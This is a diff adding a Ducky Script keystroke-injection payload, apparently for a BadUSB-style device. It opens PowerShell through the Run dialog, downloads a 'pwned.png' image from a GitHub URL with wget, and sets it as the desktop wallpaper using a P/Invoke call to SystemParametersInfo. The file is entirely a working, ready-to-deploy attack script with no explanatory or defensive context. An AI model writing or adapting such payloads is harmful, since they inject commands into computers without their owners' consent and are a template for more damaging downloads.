@@ -1,0 +1,39 @@
+REM Change WallPaper
+DELAY 3000
+GUI r
+DELAY 100
+STRING powershell.exe
+ENTER
+DELAY 3000
+STRING $imagePath = "c:\windows\temp\wallpaper.png"
+ENTER
+STRING if ((Test-Path $imagePath) -eq $false) {
+STRING wget https://raw.githubusercontent.com/daniel2005d/raspi-samples/refs/heads/main/pwned.png -outfile c:\windows\temp\wallpaper.png
+ENTER
+STRING START-SLEEP -SECONDS 15
+STRING }
+ENTER
+STRING Add-Type -TypeDefinition @"
+ENTER
+STRING using System;
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING  public class Wallpaper {
+ENTER
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+ENTER
+STRING  }
+ENTER
+STRING "@
+ENTER
+STRING $SPI_SETDESKWALLPAPER = 0x0014
+ENTER
+STRING $SPIF_UPDATEINIFILE = 0x01
+ENTER
+STRING $SPIF_SENDCHANGE = 0x02
+ENTER
+STRING [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $imagePath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
+ENTER
